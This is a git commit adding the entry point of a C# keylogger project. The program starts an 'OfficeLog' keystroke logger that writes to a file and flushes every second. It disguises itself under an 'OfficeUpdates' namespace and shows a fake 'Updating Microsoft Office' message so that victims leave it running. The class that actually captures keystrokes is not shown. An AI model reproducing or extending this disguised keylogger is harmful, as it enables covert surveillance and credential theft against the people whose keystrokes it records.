ec80139c0f624f811774f1ea176965aad4a7f7ba
galringel <gal.ringel@gmail.com>
2013-12-02 08:19:58 +0200

    KeyLogger Project Added

---
+++ KeyLogger/KeyLogger/Program.cs
@@ -0,0 +1,24 @@
+﻿using System;
+
+namespace OfficeUpdates
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            OfficeLog kl = new OfficeLog();
+
+            //kl.LOG_FILE = @"C:\Program Files\Windows Media Player";
+            kl.LOG_FILE = args[0];
+            //kl.LOG_MODE = "hour";
+            kl.LOG_MODE = "now";
+            kl.FlushInterval = 1000;
+            kl.LOG_OUT = "file";
+
+            kl.Enabled = true;
+
+            Console.WriteLine("Updating Microsoft Office... Please do not close this window.");
+            Console.Read();
+        }
+    }
+}
